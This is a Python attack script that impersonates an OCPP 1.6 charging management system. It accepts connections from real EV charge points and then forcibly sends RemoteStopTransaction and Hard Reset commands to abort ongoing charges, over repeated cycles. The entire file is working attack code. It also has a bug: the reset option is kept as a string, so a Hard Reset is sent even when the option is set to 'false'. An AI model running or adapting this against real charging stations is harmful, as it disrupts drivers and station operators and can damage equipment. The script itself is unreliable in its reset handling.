"""
CSMS Impersonation Attack

Spawns a fake CSMS that accepts connections from legitimate charge points,
captures their transaction IDs, and then forcefully sends RemoteStopTransaction
(and Reset) to abort an ongoing charge.

Env vars:
  LISTEN_HOST    Host to bind the fake CSMS (default: 0.0.0.0)
  LISTEN_PORT    Port to listen on (default: 9000)
  DELAY_S        Seconds to wait before sending RemoteStopTransaction (default: 5)
  FORCE_RESET    If "true", also sends a Hard Reset after stopping (default: false)
  NUM_CYCLES     How many attacks to send per CP connection (default: 1)
"""

import asyncio
import logging
import os
from datetime import datetime, timezone

import websockets
from ocpp.routing import on
from ocpp.v16 import ChargePoint as CSMSBase
from ocpp.v16 import call, call_result
from ocpp.v16.enums import RegistrationStatus, ResetStatus, RemoteStartStopStatus

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger("csms_impersonation")

LISTEN_HOST = os.getenv("LISTEN_HOST", "0.0.0.0")
LISTEN_PORT = int(os.getenv("LISTEN_PORT", "9000"))
DELAY_S = float(os.getenv("DELAY_S", "5"))
FORCE_RESET = os.getenv("FORCE_RESET", "false").lower()
NUM_CYCLES = int(os.getenv("NUM_CYCLES", "1"))


class FakeCSMS(CSMSBase):
    """Malicious CSMS that impersonates a legitimate central system."""

    def __init__(self, cp_id: str, connection):
        super().__init__(cp_id, connection)
        self.cp_id = cp_id
        self.transaction_id = None
        self._attack_task = None

    @on("BootNotification")
    async def on_boot_notification(self, charge_point_vendor, charge_point_model, **kwargs):
        logger.warning("[%s] Received BootNotification — accepting impersonation", self.cp_id)
        # Start the attack loop as soon as the CP is authenticated.
        # If StartTransaction arrives before the delay, the loop will use the real tx_id.
        # If not (e.g. CP race condition), the loop falls back to Reset / tx_id=0.
        if self._attack_task is None:
            self._attack_task = asyncio.create_task(self._attack_loop())
        return call_result.BootNotification(
            current_time=datetime.now(timezone.utc).isoformat(),
            interval=10,
            status=RegistrationStatus.accepted,
        )

    @on("StatusNotification")
    async def on_status_notification(self, connector_id, status, error_code, **kwargs):
        logger.info("[%s] StatusNotification | connector=%s status=%s", self.cp_id, connector_id, status)
        return call_result.StatusNotification()

    @on("StartTransaction")
    async def on_start_transaction(self, connector_id, id_tag, meter_start, timestamp, **kwargs):
        self.transaction_id = 1
        logger.warning(
            "[%s] CAPTURED StartTransaction | assigned tx_id=%s | id_tag=%s | meter_start=%s",
            self.cp_id, self.transaction_id, id_tag, meter_start,
        )
        if self._attack_task is None:
            self._attack_task = asyncio.create_task(self._attack_loop())
        return call_result.StartTransaction(
            id_tag_info={"status": "Accepted"},
            transaction_id=self.transaction_id,
        )

    @on("StopTransaction")
    async def on_stop_transaction(self, meter_stop, timestamp, transaction_id, **kwargs):
        logger.info("[%s] Received StopTransaction | tx_id=%s | meter_stop=%s", self.cp_id, transaction_id, meter_stop)
        return call_result.StopTransaction(id_tag_info={"status": "Accepted"})

    @on("MeterValues")
    async def on_meter_values(self, connector_id, meter_value, **kwargs):
        logger.info("[%s] MeterValues from CP (%d readings)", self.cp_id, len(meter_value))
        return call_result.MeterValues()

    @on("Heartbeat")
    async def on_heartbeat(self, **kwargs):
        return call_result.Heartbeat(current_time=datetime.now(timezone.utc).isoformat())

    @on("Authorize")
    async def on_authorize(self, id_tag, **kwargs):
        logger.info("[%s] Authorize | id_tag=%s", self.cp_id, id_tag)
        return call_result.Authorize(id_tag_info={"status": "Accepted"})

    @on("DataTransfer")
    async def on_data_transfer(self, vendor_id, **kwargs):
        return call_result.DataTransfer(status="Accepted")

    async def _attack_loop(self):
        """Wait, then force-stop the transaction (and optionally reset)."""
        await asyncio.sleep(DELAY_S)

        for cycle in range(1, NUM_CYCLES + 1):
            logger.warning("[%s] ATTACK cycle %d/%d", self.cp_id, cycle, NUM_CYCLES)

            tx_id = self.transaction_id if self.transaction_id is not None else 0
            try:
                logger.warning(
                    "[%s] Sending RemoteStopTransaction | tx_id=%s",
                    self.cp_id, tx_id,
                )
                resp = await self.call(call.RemoteStopTransaction(
                    transaction_id=tx_id,
                ))
                logger.warning(
                    "[%s] RemoteStopTransaction result → %s",
                    self.cp_id, resp.status,
                )
            except Exception as exc:
                logger.error("[%s] RemoteStopTransaction failed: %s", self.cp_id, exc)

            if FORCE_RESET:
                await asyncio.sleep(1)
                try:
                    logger.warning("[%s] Sending Reset (Hard)", self.cp_id)
                    resp = await self.call(call.Reset(
                        type="Hard",
                    ))
                    logger.warning("[%s] Reset result → %s", self.cp_id, resp.status)
                except Exception as exc:
                    logger.error("[%s] Reset failed: %s", self.cp_id, exc)

            if cycle < NUM_CYCLES:
                await asyncio.sleep(DELAY_S)

        logger.warning("[%s] Attack loop finished", self.cp_id)


async def on_connect(websocket, path=None):
    """Handle incoming CP connections."""
    if path is None:
        request = getattr(websocket, "request", None)
        path = getattr(request, "path", None) or getattr(websocket, "path", "/")

    request_headers = getattr(websocket, "request_headers", None)
    if request_headers is None:
        request = getattr(websocket, "request", None)
        request_headers = getattr(request, "headers", {}) if request else {}

    try:
        requested_protocols = request_headers["Sec-WebSocket-Protocol"]
    except KeyError:
        logger.info("Client hasn't requested any Subprotocol. Closing Connection")
        return await websocket.close()

    if websocket.subprotocol:
        logger.info("Protocols Matched: %s", websocket.subprotocol)
    else:
        logger.warning(
            "Protocols Mismatched | Expected Subprotocols: %s, but client supports %s | Closing connection",
            ["ocpp1.6"],
            requested_protocols,
        )
        return await websocket.close()

    cp_id = path.strip("/") or "unknown"
    logger.warning("[%s] LEGITIMATE CP CONNECTED TO FAKE CSMS", cp_id)

    csms = FakeCSMS(cp_id, websocket)
    try:
        await csms.start()
    except websockets.exceptions.ConnectionClosedOK:
        logger.info("[%s] Connection closed normally", cp_id)
    except Exception as exc:
        logger.error("[%s] Connection error: %s", cp_id, exc)


async def main():
    server = await websockets.serve(
        on_connect,
        LISTEN_HOST,
        LISTEN_PORT,
        subprotocols=["ocpp1.6"],
    )
    logger.warning("Fake CSMS listening on ws://%s:%d", LISTEN_HOST, LISTEN_PORT)
    logger.warning("DELAY_S=%s FORCE_RESET=%s NUM_CYCLES=%s", DELAY_S, FORCE_RESET, NUM_CYCLES)
    await server.wait_closed()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Stopped by user")
